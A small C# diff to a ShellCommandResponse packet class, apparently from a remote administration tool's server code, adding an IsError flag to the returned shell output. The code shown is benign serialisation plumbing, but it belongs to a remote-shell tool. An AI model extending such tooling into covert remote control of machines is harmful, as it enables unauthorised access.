@@ -8,13 +8,17 @@ namespace xServer.Core.Packets.ClientPackets
         [ProtoMember(1)]
         public string Output { get; set; }
 
+        [ProtoMember(2)]
+        public bool IsError { get; private set; }
+
         public ShellCommandResponse()
         {
         }
 
-        public ShellCommandResponse(string output)
+        public ShellCommandResponse(string output, bool _IsError = false)
         {
             this.Output = output;
+            this.IsError = _IsError;
         }
 
         public void Execute(Client client)
